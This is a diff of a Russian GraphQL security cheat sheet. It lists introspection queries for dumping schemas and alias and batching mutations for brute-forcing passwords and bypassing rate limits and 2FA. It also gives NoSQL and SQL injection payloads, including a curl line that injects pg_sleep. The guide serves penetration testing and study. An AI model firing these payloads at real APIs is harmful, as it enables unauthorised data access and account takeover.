@@ -1,4 +1,6 @@
 > GraphQL — это язык запросов для API и среда выполнения для выполнения этих запросов с использованием существующих данных, предназначенный для обеспечения эффективного взаимодействия между клиентами и серверами. Он позволяет пользователю точно указать, какие данные он хочет получить в ответе, что помогает избежать больших объектов ответа и множественных вызовов, которые иногда встречаются в REST API.
+>> Обычно возникают из-за ошибок реализации и проектирования. Например, функция интроспекции может быть оставлена активной, что позволяет пользователю отправлять запросы к API для получения информации о его схеме.
+
 
 * [Инструменты](#инструменты)
 * [Перечисление](#перечисление)
@@ -19,8 +21,6 @@
 * [Внедрения](#внедрения)
     * [NoSQL Injection](#nosql-injection)
     * [SQL Injection](#sql-injection)
-* [Лабораторные работы](#лабораторные-работы)
-* [Ссылки](#ссылки)
 
 # Инструменты
 
@@ -40,7 +40,7 @@
 
 # Перечисление
 
-### Распространенные конечные точки GraphQL
+## Распространенные конечные точки GraphQL
 
 Чаще всего GraphQL находится по конечной точке `/graphql` или `/graphiql`. Более полный список доступен в [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt).
 
@@ -56,7 +56,7 @@
 ```
 
 
-### Идентификация точки внедрения
+## Идентификация точки внедрения
 ```url
 example.com/graphql?query={__schema{types{name}}}
 example.com/graphiql?query={__schema{types{name}}}
@@ -70,7 +70,7 @@ example.com/graphiql?query={__schema{types{name}}}
 ```
 
 
-### Перечисление схемы базы данных через интроспекцию
+## Перечисление схемы базы данных через интроспекцию
 
 URL-кодированный запрос для дампа схемы базы данных.
 
@@ -186,7 +186,7 @@ __schema{queryType{name},mutationType{name},types{kind,name,description,fields(i
 {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
 
-### Перечисление схемы базы данных через подсказки
+## Перечисление схемы базы данных через подсказки
 
 Когда вы используете неизвестное ключевое слово, бэкенд GraphQL ответит подсказкой, связанной с его схемой.
 ```json
@@ -196,7 +196,7 @@ __schema{queryType{name},mutationType{name},types{kind,name,description,fields(i
 ```
 Вы также можете попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как Escape-Technologies/graphql-wordlist, когда схема GraphQL API недоступна.
 
-### Перечисление определений типов
+## Перечисление определений типов
 
 Перечислите определение интересующих типов, используя следующий запрос GraphQL, заменив "User" на выбранный тип.
 ```graphql
@@ -217,7 +217,7 @@ __schema{queryType{name},mutationType{name},types{kind,name,description,fields(i
   }
 }
 ```
-### Список путей для достижения типа
+## Список путей для достижения типа
 ```python
 $ git clone https://gitlab.com/dee-see/graphql-path-enum
 $ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
@@ -242,14 +242,14 @@ Found 27 ways to reach the "Skill" node from the "Query" node:
 # Методология
 
 ## Извлечение данных
-```
+```pyhton
 example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
 ```
 
 HTB Help - GraphQL injection
 
 ## Извлечение данных с использованием Edges/Nodes
-```
+```graphql
 {
   "query": "query {
     teams{
@@ -266,7 +266,7 @@ HTB Help - GraphQL injection
 
 ⚠️ Не забудьте экранировать " внутри options.
 
-```
+```graphql
 {
   doctors(options: "{\"patients.ssn\" :1}") {
     firstName
@@ -282,7 +282,7 @@ HTB Help - GraphQL injection
 ## Мутации
 
 Мутации работают как функции, вы можете использовать их для взаимодействия с GraphQL.
-```
+```python
 # mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
 # mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
 ```
@@ -291,18 +291,17 @@ HTB Help - GraphQL injection
 
 Распространенные сценарии:
 
-    Усиление атаки перебора паролей
-
-    Обход ограничения скорости (Rate Limit)
-
-    Обход двухфакторной аутентификации (2FA)
+* Усиление атаки перебора паролей
+* Обход ограничения скорости (Rate Limit)
+* Обход двухфакторной аутентификации (2FA)
 
 ### Пакетная обработка на основе списка JSON
 
 > Пакетная обработка запросов (Query batching) — это функция GraphQL, которая позволяет отправлять несколько запросов на сервер в одном HTTP-запросе. Вместо отправки каждого запроса в отдельном запросе клиент может отправить массив запросов в одном POST-запросе на сервер GraphQL. Это уменьшает количество HTTP-запросов и может повысить производительность приложения.
 
 Пакетная обработка запросов работает путем определения массива операций в теле запроса. Каждая операция может иметь свой собственный запрос, переменные и имя операции. Сервер обрабатывает каждую операцию в массиве и возвращает массив ответов, по одному для каждого запроса в пакете.
-```
+
+```graphql
 [
     {
         "query":"..."
@@ -319,14 +318,14 @@ HTB Help - GraphQL injection
     ...
 ]
 ```
-## Пакетная обработка на основе имени запроса
-```
+### Пакетная обработка на основе имени запроса
+```graphql
 {
     "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
 }
 ```
 Отправьте одну и ту же мутацию несколько раз, используя псевдонимы (aliases).
-```
+```graphql
 mutation {
   login(pass: 1111, username: "bob")
   second: login(pass: 2222, username: "bob")
@@ -341,7 +340,7 @@ mutation {
 ## NoSQL Injection
 
 Используйте $regex внутри параметра поиска.
-```
+```graphql
 {
   doctors(
     options: "{\"limit\": 1, \"patients.ssn\" :1}",
@@ -360,7 +359,7 @@ mutation {
 ## SQL Injection
 
 Отправьте одинарную кавычку ' внутри параметра GraphQL, чтобы вызвать SQL-инъекцию.
-```
+```graphql
 {
   bacon(id: "1'") {
     id
@@ -370,9 +369,16 @@ mutation {
 }
 ```
 Простая SQL-инъекция внутри поля GraphQL.
-```
+```bash
 curl -X POST "http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27"
 ```
+
+
+
+
+
+
+
 
 
 # Уязвимости GraphQL API
